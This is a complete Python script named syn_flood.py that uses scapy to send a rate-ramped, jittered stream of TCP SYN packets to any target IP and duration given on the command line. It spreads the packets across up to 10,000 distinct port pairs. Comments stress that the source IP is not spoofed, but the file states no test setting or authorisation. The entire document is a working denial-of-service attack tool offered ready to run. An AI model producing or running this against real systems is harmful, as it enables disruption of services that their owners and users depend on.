#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys


def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break

        phase = elapsed / duration
        yield 0.3 + (phase * 0.9)


def build_flow_pool(flow_count=10000):
    """
    Build unique TCP 5-tuples.
    Source IP is NOT spoofed.
    Only sport/dport vary to create distinct flows.
    """
    pool = []
    for _ in range(flow_count):
        pool.append((
            random.randint(20000, 65000),        # sport
            random.choice([80, 443, 22, 8080])  # dport
        ))
    return pool


def syn_flood(target_ip, duration):

    base_rate = 800
    peak_rate = 2000

    flow_pool = build_flow_pool(10000)
    flow_index = 0

    for intensity in attack_profile(duration):

        if flow_index >= len(flow_pool):
            break

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        sport, dport = flow_pool[flow_index]

        # IMPORTANT: do NOT spoof source IP
        pkt = (
            scapy.IP(dst=target_ip) /
            scapy.TCP(
                sport=sport,
                dport=dport,
                flags="S",
                seq=random.randint(0, 100000)
            )
        )

        scapy.send(pkt, verbose=0)

        flow_index += 1

        sleep_time = max(0.0003, 1.0 / current_rate)
        sleep_time *= random.uniform(0.7, 1.3)
        time.sleep(sleep_time)

    print(f"Approx SYN flows generated: {flow_index}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: syn_flood.py <target_ip> <duration>")
        sys.exit(1)

    syn_flood(sys.argv[1], int(sys.argv[2]))